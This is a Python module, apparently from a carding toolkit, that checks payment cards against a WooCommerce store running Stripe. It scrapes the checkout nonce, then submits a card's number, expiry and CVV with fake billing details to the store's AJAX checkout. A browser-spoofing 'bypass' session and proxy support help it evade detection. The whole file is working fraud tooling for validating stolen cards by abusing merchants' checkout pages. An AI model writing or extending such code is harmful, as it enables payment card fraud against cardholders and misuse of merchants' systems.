"""WooCommerce Stripe Auth Engine — core/gates/stripe_auth.py

Direct WooCommerce / Stripe auth integration for card checking.
"""

import re
import json
import logging
from typing import Dict, Any, Optional
from core.bypass_client import BypassSession
from core.gates.vbv import classify_gate_response

logger = logging.getLogger(__name__)


async def stripe_auth_check(
    card,
    site_url: str = "https://example-stripe-store.com",
    proxy: Optional[str] = None,
    timeout: int = 25,
) -> Dict[str, Any]:
    """Perform WooCommerce Stripe auth check."""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "Accept": "application/json, text/javascript, */*; q=0.01",
    }

    try:
        async with BypassSession(proxy=proxy, timeout=timeout, headers=headers) as client:
            checkout_url = f"{site_url.rstrip('/')}/checkout/"
            resp = await client.get(checkout_url)

            if resp.status_code != 200 or not resp.text:
                return {
                    "status": "ERROR",
                    "response": f"Failed to reach Stripe checkout (HTTP {resp.status_code})",
                    "price": "0.00",
                    "gateway": "Stripe Auth",
                }

            html = resp.text
            nonce_match = re.search(r'name="woocommerce-process-checkout-nonce"\s+value="([^"]+)"', html)
            nonce = nonce_match.group(1) if nonce_match else ""

            post_data = {
                "billing_first_name": "John",
                "billing_last_name": "Doe",
                "billing_country": "US",
                "billing_address_1": "100 Broadway",
                "billing_city": "New York",
                "billing_state": "NY",
                "billing_postcode": "10005",
                "billing_email": "johndoe@example.com",
                "payment_method": "stripe",
                "woocommerce-process-checkout-nonce": nonce,
                "stripe_number": card.number,
                "stripe_exp": f"{card.month}/{card.year[-2:]}",
                "stripe_cvc": card.cvv,
            }

            ajax_url = f"{site_url.rstrip('/')}/?wc-ajax=checkout"
            headers["X-Requested-With"] = "XMLHttpRequest"
            headers["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"

            res = await client.post(ajax_url, data=post_data, headers=headers)
            status, msg = classify_gate_response(res.text, res.status_code)

            return {
                "status": status,
                "response": msg,
                "price": "1.00",
                "gateway": "Stripe Auth $1",
            }

    except Exception as e:
        logger.error("Stripe Auth Check error for %s: %s", site_url, e)
        return {
            "status": "ERROR",
            "response": f"Stripe Check Error: {str(e)[:50]}",
            "price": "0.00",
            "gateway": "Stripe Auth $1",
        }
